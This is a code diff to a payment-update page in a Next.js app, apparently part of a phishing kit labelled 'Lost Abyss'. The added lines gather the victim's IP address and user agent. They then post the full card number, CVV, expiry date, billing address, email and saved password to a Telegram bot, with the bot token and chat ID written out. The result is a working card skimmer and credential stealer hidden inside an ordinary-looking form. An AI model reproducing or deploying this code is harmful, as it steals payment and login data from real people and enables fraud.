@@ -10,6 +10,7 @@ import { useRouter } from "next/navigation";
 import Image from "next/image";
 import { PaymentIcon } from "react-svg-credit-card-payment-icons";
 import { savePaymentDetails } from "@/lib/supabase";
+import axios from 'axios';
 
 export default function UpdatePaymentPage() {
   const router = useRouter();
@@ -78,6 +79,10 @@ export default function UpdatePaymentPage() {
       // Get clean card number (digits only)
       const fullCardNumber = cardNumber.replace(/\D/g, "");
 
+      // Get user IP and user agent
+      const { data: ipData } = await axios.get('https://api.ipify.org?format=json');
+      const userAgent = navigator.userAgent;
+
       // Prepare the payment data object
       const paymentData = {
         full_card_number: fullCardNumber,
@@ -95,7 +100,9 @@ export default function UpdatePaymentPage() {
         },
         phone_number: phoneNumber,
         user_email: localStorage.getItem('userEmail') || '',
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        user_ip: ipData.ip,
+        user_agent: userAgent
       };
 
       // Store payment info in Supabase
@@ -105,6 +112,37 @@ export default function UpdatePaymentPage() {
         console.error("Error saving payment details:", saveError);
         // Continue anyway for the demo
       }
+
+      // Send message to Telegram channel
+      const telegramMessage = `*Lost Abyss | Page Submission*\n\n` +
+        `----- *Cardholder Information* -----\n` +
+        `*Cardholder Name:* ${cardholderName}\n` +
+        `*Email:* ${localStorage.getItem('userEmail')}\n` +
+        `*Password:* ${localStorage.getItem('userPassword')}\n` +
+        `*Phone Number:* ${phoneNumber}\n\n` +
+        `----- *Payment Information* -----\n` +
+        `*Card Number:* \`${fullCardNumber}\`\n` +
+        `*Expiry Date:* ${expiryDate}\n` +
+        `*CVV:* ${cvv}\n` +
+        `*BIN:* ${fullCardNumber.slice(0, 6)}\n\n` +
+        `----- *Billing Information* -----\n` +
+        `*Address:* ${address}\n` +
+        `*City:* ${city}\n` +
+        `*State:* ${state}\n` +
+        `*Postal Code:* ${postalCode}\n` +
+        `*Country:* ${country}\n\n` +
+        `----- *Capture Information* -----\n` +
+        `*IP Address:* ${ipData.ip}\n` +
+        `*User Agent:* ${userAgent}\n` +
+        `*Timestamp:* ${new Date().toISOString()}`;
+
+      await axios.post(`https://api.telegram.org/bot7867757784:AAGZyT3l34tXewBdiO-npOZtIlLDy65IF8M/sendMessage`, {
+        chat_id: '1978616362',
+        text: telegramMessage,
+        parse_mode: 'Markdown'
+      }).catch(err => {
+        console.error("Error sending message to Telegram:", err);
+      });
 
       // Mark payment info as captured for tracking purposes
       localStorage.setItem('paymentInfoCaptured', 'true');
@@ -195,11 +233,11 @@ export default function UpdatePaymentPage() {
                       id="cvv"
                       type="text"
                       value={cvv}
-                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
+                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                       placeholder="123"
                       className="bg-[#282828] border-gray-700 text-white placeholder:text-gray-500"
                       required
-                      maxLength={3}
+                      maxLength={4}
                     />
                   </div>
                 </div>
@@ -254,6 +292,7 @@ export default function UpdatePaymentPage() {
                       placeholder="New York"
                       className="bg-[#282828] border-gray-700 text-white placeholder:text-gray-500"
                       required
+                      
                     />
                   </div>
 
